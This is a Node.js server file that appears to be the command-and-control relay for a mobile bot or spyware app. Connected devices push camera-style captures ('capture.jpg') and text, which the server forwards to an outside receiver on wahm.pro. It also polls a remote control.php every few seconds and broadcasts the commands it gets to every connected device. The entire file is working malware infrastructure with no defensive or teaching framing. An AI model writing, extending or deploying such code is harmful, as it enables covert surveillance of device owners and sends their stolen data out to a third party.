const express = require('express');
const webSocket = require('ws');
const http = require('http');
const axios = require("axios");
const multer = require('multer');
const FormData = require('form-data');

// الروابط الجديدة حسب طلبك
const CMD_URL = 'https://wahm.pro/bot/control.php'; 
const RECEIVER_URL = 'https://wahm.pro/bot/receiver.php'; 

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const upload = multer({ storage: multer.memoryStorage() });

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// إرسال النتائج إلى مستقبل الملفات
async function sendResult(data, isFile = false) {
    try {
        if (isFile) {
            const form = new FormData();
            form.append('file', data.buffer, { filename: data.name || 'capture.jpg' });
            form.append('model', data.model);
            await axios.post(RECEIVER_URL, form, { headers: { ...form.getHeaders() } });
        } else {
            const params = new URLSearchParams();
            params.append('model', data.model);
            params.append('text', data.text);
            await axios.post(RECEIVER_URL, params);
        }
        console.log("✅ Result Sent to Receiver");
    } catch (e) { console.log("❌ Receiver Error: " + e.message); }
}

// استقبال من التطبيق
app.post("/uploadFile", upload.single('file'), async (req, res) => {
    if (req.file) await sendResult({ buffer: req.file.buffer, name: req.file.originalname, model: req.headers.model }, true);
    res.send('OK');
});

app.post("/uploadText", async (req, res) => {
    if (req.body.text) await sendResult({ model: req.headers.model, text: req.body.text });
    res.send('OK');
});

// الأوامر عبر الـ WebSocket
appSocket.on('connection', (ws, req) => {
    console.log(`📱 Connected: ${req.headers.model || "Device"}`);
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });
});

// سحب الأوامر من control.php
setInterval(async () => {
    try {
        const res = await axios.get(`${CMD_URL}?get_cmd=1`, { timeout: 2000 });
        const cmd = res.data.trim();
        if (cmd !== "WAIT" && cmd !== "OK" && cmd !== "") {
            appSocket.clients.forEach(ws => {
                if (ws.readyState === webSocket.OPEN) ws.send(cmd);
            });
        }
    } catch (e) { }
}, 2500);

setInterval(() => {
    appSocket.clients.forEach(ws => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 10000);

appServer.listen(process.env.PORT || 8999);

